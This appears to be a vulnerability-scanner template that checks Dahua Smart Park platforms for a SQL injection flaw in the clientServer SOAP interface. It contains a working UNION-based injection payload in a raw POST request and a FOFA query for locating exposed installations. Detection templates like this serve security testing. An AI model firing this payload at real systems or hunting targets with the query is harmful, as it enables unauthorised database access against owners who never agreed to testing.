@@ -1,0 +1,32 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - c8c605999f3d8352d7bb792cf3fdb25
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - "POST /portal/services/clientServer HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
+    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
+    \ Chrome/70.0.3538.77 Safari/537.36\nContent-Type: text/xml;charset=UTF-8\nContent-Length:\
+    \ ContentLength\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n  <soapenv:Header/>\n\
+    \  <soapenv:Body>\n  <cli:getGroupInfoListByGroupId>\n    <arg0>-5398) UNION ALL\
+    \ SELECT 5336,5336,5336,5336,md5(999999999)-- -</arg0>\n    <arg1>10</arg1>\n\
+    \  </cli:getGroupInfoListByGroupId>\n  </soapenv:Body>\n</soapenv:Envelope>\n"
+id: dahua-clientserver-sqli
+info:
+  author: Co5mos
+  description: Dahua Smart Park ClientServer interface SQL injection vulnerability
+    through SOAP request.
+  metadata:
+    fofa-query: "app=\"dahua-\u667A\u6167\u56ED\u533A\u7EFC\u5408\u7BA1\u7406\u5E73\
+      \u53F0\""
+  name: Dahua Smart Park ClientServer SQL Injection Vulnerability
+  reference:
+  - https://github.com/wy876/POC/blob/9ffe279891f6c9b48ed680188ef10fc06a787f67/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BAclientServer%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L6
+  severity: high
+  tags: dahua,sqli
